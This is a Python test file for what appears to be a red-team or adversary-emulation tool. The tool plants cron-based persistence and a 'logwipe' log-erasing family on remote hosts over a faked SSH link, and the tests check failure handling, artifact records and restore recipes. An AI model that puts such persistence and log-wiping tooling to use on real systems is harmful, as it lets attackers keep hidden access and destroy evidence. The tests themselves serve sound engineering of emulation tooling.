def test_a_box_that_refuses_the_write_is_a_failed_family(tmp_path, rc, out, err,
                                                          needle):
    ssh = FakeSSH().on(pl.MARKER, rc=rc, out=out, err=err)
    result, ctx = _plant(tmp_path, "cron", ssh)
    assert result.ok is False and needle in result.detail
    assert ctx.world.artifacts(IP) == []


def test_one_failing_family_does_not_poison_the_next(tmp_path):
    ssh = FakeSSH().on("/etc/cron.d/prune", rc="raise")     # only logwipe fails
    ssh.on(pl.MARKER, out=f"TLALOC_PLANT family=cron {CREATE}")
    ctx = _ctx(tmp_path, ssh)
    failed = pl.apply(ctx, IP, "logwipe", dict(NAMES))
    assert failed.ok is False and "TransportError" in failed.detail
    good = pl.apply(ctx, IP, "cron", dict(NAMES))
    assert good.ok and good.artifacts[0]["kind"] == "persist-cron"
    assert good.restore and good.restore["recipe"]


def test_a_refused_family_through_the_front_end_records_the_failure(tmp_path):
    ssh = FakeSSH().on(pl.MARKER, rc=1, err="read-only file system")
    ctx = _ctx(tmp_path, ssh)
    result = execute("persist", {"ip": IP, "family": "cron"}, ctx)
    assert result.ok is False and "rc=1" in result.detail
    assert ctx.world.failure_count("persist", IP) == 1
    assert ctx.world.artifacts(IP) == []
